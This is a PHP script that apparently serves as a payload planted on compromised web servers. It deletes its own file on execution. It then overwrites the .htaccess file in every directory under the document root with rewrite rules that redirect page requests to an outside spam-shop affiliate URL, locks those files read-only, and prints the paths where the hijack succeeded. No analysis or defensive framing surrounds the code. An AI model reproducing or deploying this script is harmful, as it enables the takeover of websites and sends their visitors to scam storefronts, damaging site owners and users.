<?php unlink(__FILE__); function checkRedirect($url, $must_be_url)
{

//echo $url;

        $headers = get_headers($url);



        if ($headers) {
//        var_dump($headers) . PHP_EOL;

         $header = implode(PHP_EOL, $headers);

         if ((strpos($header , $must_be_url ) !== false) and (strpos($header , 'HTTP/1.1 302 Found' ) !== false))
        {
//         echo  PHP_EOL . PHP_EOL . $header . PHP_EOL . PHP_EOL;
        return true;
         }




        }
        return false;
}


//--------


function parseDir($dir)
{

$result = array();

$dir = str_replace( "\\", "/" , $dir );
$dir = str_replace( "//", "/" , $dir );

//echo $dir . PHP_EOL;



 $num = 1;

  while (strlen($dir) >= 10) {


$position = strpos($dir, "/");

if (strpos($dir,'/') !== false) {}else{break;}

$dir = substr($dir, $position + 1, 1000);
//echo $dir . '/hz' . PHP_EOL;
array_push($result, $dir . '/hz');        
    $num++;
    if ($num > 15){break;}
  }
return $result;
} 


$shop_name = 'http://trustedhotmart.com/?cid=exrated';

$htaccess = 'RewriteRule ^([A-Za-z0-9-]+).html$ ##DOMAIN## [L]' . PHP_EOL;
$htaccess.= 'RewriteRule ^([A-Za-z0-9-]+).txt$ ##DOMAIN## [L]' . PHP_EOL;
$htaccess.= 'RewriteCond %{REQUEST_FILENAME} !-d' . PHP_EOL;
$htaccess.= 'RewriteCond %{REQUEST_FILENAME} !-f' . PHP_EOL;
$htaccess.= 'RewriteRule . ##DOMAIN## [L]' . PHP_EOL;

$htaccess = str_replace( "##DOMAIN##", $shop_name , $htaccess );

//echo $htaccess . PHP_EOL. PHP_EOL;


$shell_url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] ;


$root =  $_SERVER["DOCUMENT_ROOT"];
if (strpos($root,'/') !== false) {
    $path =  $root . "/";
}
else $path = $root . "\\";

//echo $path . PHP_EOL;

$root = $path;

//$dir = '.';
//$dir = dirname($root);
$dir = $root;

//echo $root . ' ****** ' ;




$directories = glob($dir . '/*', GLOB_ONLYDIR);

foreach ($directories as $value){
$fname = $value . '/.htaccess';
chmod($fname, 0644);
file_put_contents($fname, $htaccess);
chmod($fname, 0444);
//echo $shell_url . ' --------- ' . $value . PHP_EOL;

$dir_check =  parseDir($value);

$mystr = $value;
$findMe   =  $_SERVER['HTTP_HOST'] ;
$position = strpos($mystr, $findMe);

foreach($dir_check as $check_dir) {

$check_link = ltrim(rtrim($shell_url . '/' . $check_dir));
//echo  $check_link . PHP_EOL;

                    
$isRedirect = checkRedirect($check_link, $shop_name);

//checkRedirect('http://store.levelim.com/home/c3rw7wiz3mz7/public_html/store.levelim.com/wp-includes/hz' , 'ttt');

if(!$isRedirect )
{
 //  echo "URL Not Redirected";
}else{
echo $check_link . PHP_EOL;
}


}


//echo file_get_contents($fname) . PHP_EOL . PHP_EOL ;



}
